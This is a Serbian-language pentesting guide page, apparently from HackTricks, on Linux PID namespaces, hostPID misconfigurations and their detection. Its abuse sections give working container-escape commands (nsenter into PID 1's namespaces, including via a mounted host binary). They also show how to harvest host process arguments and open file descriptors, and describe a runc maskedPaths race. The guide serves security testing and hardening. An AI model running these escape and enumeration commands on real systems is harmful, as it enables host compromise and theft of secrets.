# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

PID namespace kontroliše način numerisanja procesa i procese koji su vidljivi. Zbog toga container može imati sopstveni PID 1 iako nije prava mašina. Unutar namespace-a, workload vidi ono što izgleda kao lokalno stablo procesa. Izvan namespace-a, host i dalje vidi stvarne PID-ove hosta i celokupno okruženje procesa.

Iz bezbednosne perspektive, PID namespace je važan zato što je vidljivost procesa vredna. Kada workload može da vidi procese hosta, možda može da posmatra nazive servisa, argumente komandne linije, secrets prosleđene u argumentima procesa, stanje izvedeno iz okruženja kroz `/proc` i potencijalne ciljeve za ulazak u namespace. Ako može da uradi više od samog posmatranja tih procesa, na primer da šalje signals ili koristi ptrace pod odgovarajućim uslovima, problem postaje mnogo ozbiljniji.

## Operacija

Novi PID namespace počinje sa sopstvenim internim numerisanjem procesa. Prvi proces kreiran unutar njega postaje PID 1 iz perspektive tog namespace-a, što takođe znači da dobija posebnu init-like semantiku za orphaned children i ponašanje signals. Ovo objašnjava mnoge neobičnosti container-a u vezi sa init procesima, uklanjanjem zombie procesa i razlogom zbog kog se u container-ima ponekad koriste mali init wrappers.

Važna bezbednosna pouka jeste da proces može izgledati izolovano zato što vidi samo svoje PID stablo, ali ta izolacija može biti namerno uklonjena. Docker ovo izlaže kroz `--pid=host`, dok Kubernetes to radi pomoću `hostPID: true`. Kada se container pridruži PID namespace-u hosta, workload direktno vidi procese hosta i mnogi kasniji attack paths postaju znatno realniji.

## Lab

Za ručno kreiranje PID namespace-a:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sada vidi privatni prikaz procesa. Flag `--mount-proc` je važan zato što montira procfs instancu koja odgovara novom PID namespace-u, čime lista procesa iznutra postaje koherentna.

Za poređenje ponašanja container-a:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Razlika je neposredna i lako razumljiva, zbog čega je ovo dobra prva laboratorijska vežba za čitaoce.

## Korišćenje runtime-a

Standardni container-i u Docker-u, Podman-u, containerd-u i CRI-O-u dobijaju sopstveni PID namespace. Kubernetes Pod-ovi takođe obično dobijaju izolovani prikaz PID-ova, osim ako workload izričito zatraži deljenje host PID namespace-a. LXC/Incus okruženja oslanjaju se na isti kernel primitive, iako slučajevi upotrebe system-container-a mogu izložiti složenija stabla procesa i podstaći više debugging prečica.

Isto pravilo važi svuda: ako runtime odluči da ne izoluje PID namespace, to predstavlja namerno slabljenje granice između container-a i host-a.

## Pogrešne konfiguracije

Tipična pogrešna konfiguracija jeste deljenje host PID namespace-a. Timovi to često opravdavaju debugging-om, monitoring-om ili praktičnošću upravljanja servisima, ali to uvek treba tretirati kao značajan bezbednosni izuzetak. Čak i ako container nema neposredan write primitive nad host procesima, sama vidljivost može otkriti mnogo informacija o sistemu. Kada se dodaju capabilities kao što su `CAP_SYS_PTRACE` ili koristan procfs pristup, rizik se značajno povećava.

Druga greška je pretpostavka da je deljenje host PID namespace-a bezopasno samo zato što workload po podrazumevanim podešavanjima ne može da ubije host procese niti da nad njima izvrši ptrace. Takav zaključak zanemaruje vrednost enumeration-a, dostupnost ciljeva za ulazak u namespace i način na koji se vidljivost PID-ova kombinuje sa drugim oslabljenim kontrolama.

## Zloupotreba

Ako se host PID namespace deli, attacker može da pregleda host procese, prikuplja argumente procesa, identifikuje zanimljive servise, pronađe potencijalne PID-ove za `nsenter` ili kombinuje vidljivost procesa sa privilegijama povezanim sa ptrace-om kako bi ometao host ili susedne workload-e. U nekim slučajevima, samo uočavanje odgovarajućeg dugotrajnog procesa dovoljno je da promeni ostatak attack plana.

Prvi praktični korak uvek je potvrda da su host procesi zaista vidljivi:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Kada PID-ovi hosta postanu vidljivi, argumenti procesa i ciljevi za ulazak u namespace često postaju najkorisniji izvor informacija:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ako je `nsenter` dostupan i postoje dovoljne privilegije, proverite da li vidljivi proces hosta može da se koristi kao most ka namespace-u:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Čak i kada je ulazak blokiran, deljenje PID-ova hosta je već korisno jer otkriva raspored servisa, komponente runtime-a i potencijalne privilegovane procese koji mogu biti sledeća meta.

Vidljivost PID-ova hosta takođe čini zloupotrebu deskriptora datoteka realnijom. Ako privilegovani proces na hostu ili susedni workload ima otvorenu osetljivu datoteku ili socket, napadač možda može da pregleda `/proc/<pid>/fd/` i ponovo upotrebi taj deskriptor, u zavisnosti od vlasništva, opcija montiranja procfs-a i modela ciljnog servisa.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ove komande su korisne jer pokazuju da li `hidepid=1` ili `hidepid=2` smanjuje vidljivost između procesa i da li su očigledno interesantni descriptor-i, kao što su otvoreni secret fajlovi, logovi ili Unix socketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID-a postaje direktan host escape kada proces takođe ima dovoljno privilegija da se pridruži host namespace-ovima:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ako komanda uspe, proces kontejnera se sada izvršava u host mount, UTS, network, IPC i PID namespaces. Posledica je trenutni kompromis hosta.

Čak i kada sam `nsenter` nedostaje, isti rezultat se može postići korišćenjem host binary-ja ako je host filesystem montiran:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Skorije napomene o runtime-u

Neki napadi relevantni za PID namespace nisu tradicionalne pogrešne konfiguracije `hostPID: true`, već greške u implementaciji runtime-a povezane sa načinom na koji se procfs zaštite primenjuju tokom podešavanja containera.

#### `maskedPaths` race do host procfs-a

U ranjivim verzijama alata `runc`, napadači koji mogu da kontrolišu container image ili workload za `runc exec` mogli su da izazovu race tokom faze maskiranja tako što bi zamenili `/dev/null` sa strane containera symlinkom ka osetljivoj procfs putanji, kao što je `/proc/sys/kernel/core_pattern`. Ako bi race uspeo, bind mount za masked path mogao je da se postavi na pogrešnu metu i izloži host-globalne procfs parametre novom containeru.

Korisna komanda za proveru:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ovo je važno zato što konačni uticaj može biti isti kao kod direktnog izlaganja `procfs`: upisivi `core_pattern` ili `sysrq-trigger`, nakon čega slede izvršavanje koda na hostu ili uskraćivanje usluge.

#### Namespace injection sa `insject`

Alati za Namespace injection, kao što je `insject`, pokazuju da interakcija sa PID namespace-om ne zahteva uvek prethodni ulazak u ciljni namespace pre kreiranja procesa. Pomoćni proces može da se prikači naknadno, koristi `setns()` i izvršava se uz očuvanu vidljivost u ciljnom PID prostoru:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ova vrsta tehnike je prvenstveno važna za napredno debagovanje, offensive tooling i post-exploitation workflow-e u kojima kontekst namespace-a mora da se pridruži nakon što je runtime već inicijalizovao workload.

### Povezani obrasci zloupotrebe FD-a

Dva obrasca vredi izričito izdvojiti kada su host PID-ovi vidljivi. Prvo, privilegovani proces može zadržati otvoren osetljiv file descriptor tokom `execve()` ako nije označen sa `O_CLOEXEC`. Drugo, servisi mogu prosleđivati file descriptor-e preko Unix socket-a koristeći `SCM_RIGHTS`. U oba slučaja interesantan objekat više nije pathname, već već otvoreni handle koji proces sa nižim privilegijama može naslediti ili primiti.

Ovo je važno u radu sa container-ima zato što handle može pokazivati na `docker.sock`, privilegovani log, host secret fajl ili drugi objekat visoke vrednosti, čak i kada sam path nije direktno dostupan iz filesystem-a container-a.

## Provere

Svrha ovih komandi je da utvrde da li proces ima privatni PID prikaz ili već može da enumeriše znatno širi pregled procesa.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Šta je ovde zanimljivo:

- Ako lista procesa sadrži očigledne servise hosta, deljenje PID-ova hosta je verovatno već aktivno.
- Videti samo malo stablo procesa lokalno za container predstavlja uobičajenu osnovu; `systemd`, `dockerd` ili nepovezane daemone ne bi trebalo videti.
- Kada PID-ovi hosta postanu vidljivi, čak i read-only informacije o procesima postaju korisne za izviđanje.

Ako otkrijete da container radi sa deljenjem PID-ova hosta, nemojte to tretirati kao kozmetičku razliku. To predstavlja veliku promenu u onome što workload može da posmatra i potencijalno utiče na njega.
{{#include ../../../../../banners/hacktricks-training.md}}
